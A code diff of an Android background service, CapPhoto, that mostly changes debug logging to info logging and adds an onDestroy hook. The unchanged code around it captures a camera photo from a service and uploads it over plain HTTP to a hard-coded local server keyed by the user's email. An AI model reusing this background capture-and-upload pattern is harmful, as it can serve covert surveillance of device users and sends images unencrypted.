@@ -40,12 +40,14 @@ public class CapPhoto extends Service
     public void onCreate()
     {
         super.onCreate();
-        Log.d("CAM", "start");
+        Log.i("CAM", "start");
     }
     @RequiresApi(api = Build.VERSION_CODES.M)
 
     @Override
     public int onStartCommand (Intent intent, int flags, int startId) {
+
+        Log.i("cap-photo","started");
         mPrefs = PreferenceManager.getDefaultSharedPreferences(this);
         email=mPrefs.getString("uname","null");
         Toast.makeText(this,"service running "+startId,Toast.LENGTH_LONG).show();
@@ -60,7 +62,7 @@ public class CapPhoto extends Service
             } catch (Exception e)
             {
                 Toast.makeText(this,"err in open "+e.toString(), Toast.LENGTH_LONG).show();
-                Log.d("err",e.toString());
+                Log.i("err",e.toString());
             }
         }
 
@@ -75,7 +77,7 @@ public class CapPhoto extends Service
                 parameters = mCamera.getParameters();
                 mCamera.setParameters(parameters);
                 mCamera.startPreview();
-                Log.d("START","STARTED");
+                Log.i("START","STARTED");
                 mCamera.takePicture(null,null,null,mCall);
 
             } catch (Exception e) {
@@ -103,8 +105,9 @@ public class CapPhoto extends Service
                         URL url = null;
                         try {
                             url = new URL("http://192.168.43.170:5555/click/"+email);
+                            Log.i("data","data-sending");
                         } catch (MalformedURLException e) {
-                            Log.d("err",e.toString());
+                            Log.i("err",e.toString());
                             e.printStackTrace();
                         }
                         HttpURLConnection conn = null;
@@ -112,7 +115,7 @@ public class CapPhoto extends Service
                             assert url != null;
                             conn = (HttpURLConnection) url.openConnection();
                         } catch (IOException e) {
-                            Log.d("err",e.toString());
+                            Log.i("err",e.toString());
                             e.printStackTrace();
                         }
 
@@ -127,28 +130,29 @@ public class CapPhoto extends Service
                             int postDataLength = postData.length;
                             conn.setRequestProperty("Content-Length", Integer.toString(postDataLength ));
                         } catch (Exception e) {
-                            Log.d("err",e.toString());
+                            Log.i("err",e.toString());
                             e.printStackTrace();
                         }
                         OutputStream os = null;
                         try {
                             os = conn.getOutputStream();
                         } catch (Exception e) {
-                            Log.d("err",e.toString());
+                            Log.i("err",e.toString());
                             e.printStackTrace();
                         }
                         try {
                             assert os != null;
 
                             os.write(postData);
+                            Log.i("data","data-writing");
                         } catch (Exception e) {
-                            Log.d("err",e.toString());
+                            Log.i("err",e.toString());
                             e.printStackTrace();
                         }
                         try {
                             os.flush();
                         } catch (IOException e) {
-                            Log.d("err",e.toString());
+                            Log.i("err",e.toString());
                             e.printStackTrace();
                         }
                         os.close();
@@ -165,7 +169,7 @@ public class CapPhoto extends Service
 
                         conn.disconnect();
                     } catch (Exception e) {
-                        Log.d("err",e.toString());
+                        Log.i("err",e.toString());
                         e.printStackTrace();
                     }
 
@@ -180,11 +184,18 @@ public class CapPhoto extends Service
             }
             if(response.toString().equals("got"))
             {
-                Log.d("success","image sent");
+                Log.i("success","image sent");
             }
+            Log.i("data","exit");
         }
     };
 
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        Log.i("cap-photo","destroyed");
+    }
 
     @Override
     public IBinder onBind(Intent intent) {
